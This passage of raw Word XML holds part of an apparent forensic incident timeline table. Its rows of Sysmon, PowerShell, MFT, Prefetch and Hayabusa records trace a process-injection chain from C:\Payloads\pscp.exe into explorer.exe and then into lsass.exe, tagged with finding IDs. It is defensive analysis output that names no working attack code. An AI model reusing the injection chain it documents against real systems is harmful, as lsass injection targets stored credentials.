              <w:t xml:space="preserve">"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" </w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 1088, ProcessGUID: e6e9f951-0de1-654e-8801-000000000500 | RuleName: - | MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481 | ParentProcess: C:\Windows\explorer.exe | ParentProcessID: 2432, ParentProcessG</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18642</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-008, F-012, T-009</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:02:58.244323</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B) ; $FN modification (M) ; $FN access (A) ; $FN MFT change (C)</w:t>
              <w:br/>
              <w:t>C:\Transcript\20231110\PowerShell_transcript.DESKTOP-KJ81A5A.6HrokibP.20231110030258.txt</w:t>
              <w:br/>
              <w:t>size=950</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#116397</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-018</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:04.599586</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-PowerShell/Operational 4103 | Microsoft-Windows-PowerShell | Pipeline executed | Command Name:  | Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | Script Name:  | ConnectedUser:  | Host Name: ConsoleHost | Payload: CommandInvocation(Out-Default): "Out-Default", ParameterBinding(Out-Default): name="InputObject"; value="pscp.exe", ParameterBinding(Out-</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#8737</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-PowerShell%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-008</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:09.877971</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-PowerShell/Operational 4104 | Microsoft-Windows-PowerShell | Contains contents of scripts run | Path:  | ScriptBlockText: .\pscp.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#8742</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-PowerShell%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-005, F-008, T-009</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:09.900579</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>PSCP.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=1DCA12FC False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#98</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\prefetch\PSCP.EXE-1DCA12FC.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-005, F-008, I-018, T-003, T-018</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:09.902865</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>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C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | Par</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18650</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-005, F-008, F-012, I-001, I-002, I-006, I-010, I-011, I-017, T-003, T-009</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:09.978687</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>EXPLORER.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=3C49D11 False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#37</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\prefetch\EXPLORER.EXE-03C49D11.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-008</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:09.989870</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>explorer.exe</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 7324, ProcessGUID: e6e9f951-0ded-654e-9001-000000000500 | RuleName: - | MD5=9FBBF189473A313776019D2EAA72A47A,SHA256=CEF64201A97E08834F5C8952907A1719531A7D99B53309CB2E2956F40CFF3486,IMPHASH=D505016A935B17367AA0263582F3F1E2 | ParentProcess: C:\Payloads\pscp.exe | ParentProcessID: 2196, ParentProcessGUID</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18651</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-005, F-008, I-017, T-003, T-018</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:09.990000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Detection Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>medium</w:t>
              <w:br/>
              <w:t>Proc Injection | {"SrcProc":"C:\\Payloads\\pscp.exe","TgtProc":"C:\\Windows\\explorer.exe","SrcPID":2196,"SrcPGUID":"E6E9F951-0DED-654E-8F01-000000000500","TgtPID":7324,"TgtPGUID":"E6E9F951-0DED-654E-9001-000000000500"} | {"NewThreadId":5968,"RuleName":"-","SourceUser":"DESKTOP-KJ81A5A\\medmondson","StartAddress":"0x0000000000B30000","StartFunction":"-","StartModule":"-","TargetUser":"DESKTOP-KJ81</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#1574</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-005</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:09.990398</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 8 | Microsoft-Windows-Sysmon | CreateRemoteThread | StartAddress: 0x0000000000B30000 | RuleName: - | SourceProcessID: 2196, SourceProcessGUID: e6e9f951-0ded-654e-8f01-000000000500 | SourceImage: C:\Payloads\pscp.exe | TargetProcessID: 7324, TargetProcessGUID: e6e9f951-0ded-654e-9001-000000000500 | TargetImage: C:\Windows\explorer.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18652</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-005, T-003, T-018</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:56.300000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Detection Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>medium</w:t>
              <w:br/>
              <w:t xml:space="preserve">Proc Injection | {"SrcProc":"C:\\Windows\\explorer.exe","TgtProc":"C:\\Windows\\system32\\lsass.exe","SrcPID":7324,"SrcPGUID":"E6E9F951-0DED-654E-9001-000000000500","TgtPID":648,"TgtPGUID":"E6E9F951-0900-654E-0C00-000000000500"} | {"NewThreadId":2988,"RuleName":"-","SourceUser":"DESKTOP-KJ81A5A\\medmondson","StartAddress":"0x0000028F43080000","StartFunction":"-","StartModule":"-","TargetUser":"NT </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#1575</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-005</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:56.300284</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 8 | Microsoft-Windows-Sysmon | CreateRemoteThread | StartAddress: 0x0000028F43080000 | RuleName: - | SourceProcessID: 7324, SourceProcessGUID: e6e9f951-0ded-654e-9001-000000000500 | SourceImage: C:\Windows\explorer.exe | TargetProcessID: 648, TargetProcessGUID: e6e9f951-0900-654e-0c00-000000000500 | TargetImage: C:\Windows\system32\lsass.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18654</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-005, T-004</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:04:13.885211</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\system32\cmd.exe</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 6600, ProcessGUID: e6e9f951-0e2d-654e-9101-000000000500 | RuleName: - | MD5=9D59442313565C2E0860B88BF32B2277,SHA256=D0CEB18272966AB62B8EDFF100E9B4A6A3CB5DC0F2A32B2B18721FEA2D9C09A5,IMPHASH=272245E2988E1E430500B852C4FB5E18 | ParentProcess: C:\Windows\explorer.exe | ParentProcessID: 7324, ParentProcessG</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18655</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-006, I-017, T-005</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:04:39.853697</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, previous)</w:t>
              <w:br/>
              <w:t>TRACERT.EXE</w:t>
              <w:br/>
              <w:t>runs=3 hash=EC2ABA23 False</w:t>
